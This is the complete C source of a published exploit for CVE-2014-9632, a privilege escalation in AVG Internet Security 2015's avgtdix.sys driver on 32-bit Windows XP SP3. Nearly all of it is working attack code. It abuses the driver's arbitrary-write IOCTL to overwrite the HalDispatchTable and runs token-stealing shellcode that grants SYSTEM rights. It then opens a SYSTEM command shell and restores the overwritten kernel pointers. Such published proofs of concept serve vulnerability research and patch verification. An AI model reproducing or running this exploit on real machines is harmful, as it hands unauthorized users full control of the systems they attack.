?/*

Exploit Title    - AVG Internet Security 2015 Arbitrary Write Privilege Escalation
Date             - 04th February 2015
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - http://www.avg.com/
Tested Version   - 2015.0.5315 
Driver Version   - 15.0.0.5204 - avgtdix.sys
Tested on OS     - 32bit Windows XP SP3 
OSVDB            - http://www.osvdb.org/show/osvdb/113824
CVE ID           - CVE-2014-9632
Vendor fix url   - http://www.avg.com/eu-en/avg-release-notes
Fixed Version    - 2015.0.5557
Fixed driver ver - 15.0.0.5553



Note
----
Overwritten HAL dispatch table after exploit

kd> dps nt!HalDispatchTable l c
8054ccb8  00000003
8054ccbc  00340000
8054ccc0  8678d9a0
8054ccc4  0a050002
8054ccc8  6e66744e
8054cccc  001c0707
8054ccd0  00000180
8054ccd4  000001a4
8054ccd8  867d6690
8054ccdc  86706480
8054cce0  00000000
8054cce4  804e42d1 nt!ObpTraceDepth+0x19

10 pointers get overwritten. Since input buffer is in our control and pointers
are static in XP I've triggered the overwrite again restoring the pointers.

*/


#include <stdio.h>
#include <windows.h>

#define BUFSIZE 4096


typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
     PVOID   Unknown1;
     PVOID   Unknown2;
     PVOID   Base;
     ULONG   Size;
     ULONG   Flags;
     USHORT  Index;
     USHORT  NameLength;
     USHORT  LoadCount;
     USHORT  PathLength;
     CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
 
typedef struct _SYSTEM_MODULE_INFORMATION {
     ULONG   Count;
     SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS { 
     SystemModuleInformation = 11,
     SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength);

typedef NTSTATUS (WINAPI *_NtQueryIntervalProfile)(
     DWORD ProfileSource, 
     PULONG Interval);

typedef void (*FUNCTPTR)(); 



// Windows XP SP3

#define XP_KPROCESS 0x44      // Offset to _KPROCESS from a _ETHREAD struct
#define XP_TOKEN    0xc8      // Offset to TOKEN from the _EPROCESS struct
#define XP_UPID     0x84      // Offset to UniqueProcessId FROM the _EPROCESS struct
#define XP_APLINKS  0x88      // Offset to ActiveProcessLinks _EPROCESS struct


BYTE token_steal_xp[] =
{
  0x52,                                                  // push edx                       Save edx on the stack
  0x53,	                                                 // push ebx                       Save ebx on the stack
  0x33,0xc0,                                             // xor eax, eax                   eax = 0
  0x64,0x8b,0x80,0x24,0x01,0x00,0x00,                    // mov eax, fs:[eax+124h]         Retrieve ETHREAD
  0x8b,0x40,XP_KPROCESS,                                 // mov eax, [eax+XP_KPROCESS]     Retrieve _KPROCESS
  0x8b,0xc8,                                             // mov ecx, eax
  0x8b,0x98,XP_TOKEN,0x00,0x00,0x00,                     // mov ebx, [eax+XP_TOKEN]        Retrieves TOKEN
  0x8b,0x80,XP_APLINKS,0x00,0x00,0x00,                   // mov eax, [eax+XP_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
  0x81,0xe8,XP_APLINKS,0x00,0x00,0x00,                   // sub eax, XP_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
  0x81,0xb8,XP_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,  // cmp [eax+XP_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
  0x75,0xe8,                                             // jne                     ---- 
  0x8b,0x90,XP_TOKEN,0x00,0x00,0x00,                     // mov edx, [eax+XP_TOKEN]        Retrieves TOKEN and stores on EDX
  0x8b,0xc1,                                             // mov eax, ecx                   Retrieves KPROCESS stored on ECX
  0x89,0x90,XP_TOKEN,0x00,0x00,0x00,                     // mov [eax+XP_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
  0x5b,                                                  // pop ebx                        Restores ebx
  0x5a,                                                  // pop edx                        Restores edx
  0xc2,0x08                                              // ret 8                          Away from the kernel    
};



BYTE restore_pointers_xp[] =  // kd> dps nt!HalDispatchTable
"\xf2\xa3\x6f\x80"            // 8054ccbc  806fa3f2 hal!HaliQuerySystemInformation
"\xce\xa3\x6f\x80"            // 8054ccc0  806fa3ce hal!HaliSetSystemInformation
"\x0b\x46\x61\x80"            // 8054ccc4  8061460b nt!xHalQueryBusSlots
"\x00\x00\x00\x00"            // 8054ccc8  00000000
"\x4d\xac\x50\x80"            // 8054cccc  8050ac4d nt!HalExamineMBR
"\x89\x6f\x5c\x80"            // 8054ccd0  805c6f89 nt!IoAssignDriveLetters
"\xe5\x4a\x5c\x80"            // 8054ccd4  805c4ae5 nt!IoReadPartitionTable
"\x7b\x3f\x61\x80"            // 8054ccd8  80613f7b nt!IoSetPartitionInformation
"\xef\x41\x61\x80"            // 8054ccdc  806141ef nt!IoWritePartitionTable
"\x57\xd1\x52\x80";           // 8054cce0  8052d157 nt!CcHasInactiveViews



DWORD HalDispatchTableAddress() 
{
    _NtQuerySystemInformation    NtQuerySystemInformation;
    PSYSTEM_MODULE_INFORMATION   pModuleInfo;
    DWORD                        HalDispatchTable;
    CHAR                         kFullName[256];
    PVOID                        kBase = NULL;
    LPSTR                        kName;
    HMODULE                      Kernel;
    FUNCTPTR                     Hal;
    ULONG                        len;
    NTSTATUS                     status;


    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
 	
    if (!NtQuerySystemInformation)
    {
        printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
        return -1;  
    }

    status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

    if (!status) 
    {
        printf("[-] An error occured while reading NtQuerySystemInformation. Status = 0x%08x\n\n", status);
        return -1;
    }
		
    pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);

    if(pModuleInfo == NULL)
    {
        printf("[-] An error occurred with GlobalAlloc for pModuleInfo\n\n");
        return -1;
    }

    status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	
    memset(kFullName, 0x00, sizeof(kFullName));
    strcpy_s(kFullName, sizeof(kFullName)-1, pModuleInfo->Module[0].ImageName);
    kBase = pModuleInfo->Module[0].Base;

    printf("[i] Kernel base name %s\n", kFullName);
    kName = strrchr(kFullName, '\\');

    Kernel = LoadLibraryA(++kName);

    if(Kernel == NULL) 
    {
        printf("[-] Failed to load kernel base\n\n");
        return -1;
    }

    Hal = (FUNCTPTR)GetProcAddress(Kernel, "HalDispatchTable");

    if(Hal == NULL)
    {
        printf("[-] Failed to find HalDispatchTable\n\n");
        return -1;
    }
    
    printf("[i] HalDispatchTable address 0x%08x\n", Hal);	
    printf("[i] Kernel handle 0x%08x\n", Kernel);
    printf("[i] Kernel base address 0x%08x\n", kBase);          

    HalDispatchTable = ((DWORD)Hal - (DWORD)Kernel + (DWORD)kBase);

    printf("[+] Kernel address of HalDispatchTable 0x%08x\n", HalDispatchTable);

    if(!HalDispatchTable)
    {
        printf("[-] Failed to calculate HalDispatchTable\n\n");
        return -1;
    }

    return HalDispatchTable;
}


int GetWindowsVersion()
{
    int v = 0;
    DWORD version = 0, minVersion = 0, majVersion = 0;

    version = GetVersion();

    minVersion = (DWORD)(HIBYTE(LOWORD(version)));
    majVersion = (DWORD)(LOBYTE(LOWORD(version)));

    if (minVersion == 1 && majVersion == 5) v = 1;  // "Windows XP;
    if (minVersion == 1 && majVersion == 6) v = 2;  // "Windows 7";
    if (minVersion == 2 && majVersion == 5) v = 3;  // "Windows Server 2003;

    return v;
}


void spawnShell()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;


    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    si.cb          = sizeof(si); 
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("\n[-] CreateProcess failed (%d)\n\n", GetLastError());
        return;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}



int main(int argc, char *argv[]) 
{

    _NtQueryIntervalProfile     NtQueryIntervalProfile;
    LPVOID                      input[1] = {0};    
    LPVOID                      addrtoshell;
    HANDLE                      hDevice;
    DWORD                       dwRetBytes = 0;
    DWORD                       HalDispatchTableTarget;
    ULONG                       time = 0;
    unsigned char               devhandle[MAX_PATH]; 


    printf("-------------------------------------------------------------------------------\n");
    printf("     AVG Internet Security 2015 (avgtdix.sys) Arbitrary Write EoP Exploit      \n");
    printf("                         Tested on Windows XP SP3 (32bit)                      \n");
    printf("-------------------------------------------------------------------------------\n\n");

    if (GetWindowsVersion() == 1) 
    {
        printf("[i] Running Windows XP\n");
    }

    if (GetWindowsVersion() == 0) 
    {
        printf("[i] Exploit not supported on this OS\n\n");
        return -1;
    }  

    sprintf(devhandle, "\\\\.\\%s", "avgtdi");

    NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");
 	
    if (!NtQueryIntervalProfile)
    {
        printf("[-] Unable to resolve NtQueryIntervalProfile\n\n");
        return -1;  
    }
   
    addrtoshell = VirtualAlloc(NULL, BUFSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if(addrtoshell == NULL)
    {
        printf("[-] VirtualAlloc allocation failure %.8x\n\n", GetLastError());
        return -1;
    }
    printf("[+] VirtualAlloc allocated memory at 0x%.8x\n", addrtoshell);

    memset(addrtoshell, 0x90, BUFSIZE);
    memcpy(addrtoshell, token_steal_xp, sizeof(token_steal_xp));
    printf("[i] Size of shellcode %d bytes\n", sizeof(token_steal_xp));

    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
    
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFile open %s device failed (%d)\n\n", devhandle, GetLastError());
        return -1;
    }
    else 
    {
        printf("[+] Open %s device successful\n", devhandle);
    }

    HalDispatchTableTarget = HalDispatchTableAddress() + sizeof(DWORD);
    printf("[+] HalDispatchTable+4 (0x%08x) will be overwritten\n", HalDispatchTableTarget);

    input[0] = addrtoshell;  // input buffer contents gets written to our output buffer address
                    
    printf("[+] Input buffer contents %08x\n", input[0]);
 	
    printf("[~] Press any key to send Exploit  . . .\n");
    getch();

    DeviceIoControl(hDevice, 0x830020f8, input, sizeof(input), (LPVOID)HalDispatchTableTarget, 0, &dwRetBytes, NULL);

    printf("[+] Buffer sent\n");

    printf("[+] Spawning SYSTEM Shell\n");
    NtQueryIntervalProfile(2, &time);
    spawnShell();

    printf("[+] Restoring Hal dispatch table pointers\n\n");

    DeviceIoControl(hDevice, 0x830020f8, restore_pointers_xp, sizeof(restore_pointers_xp)-1, (LPVOID)HalDispatchTableTarget, 0, &dwRetBytes, NULL);

    CloseHandle(hDevice);

    return 0;
}
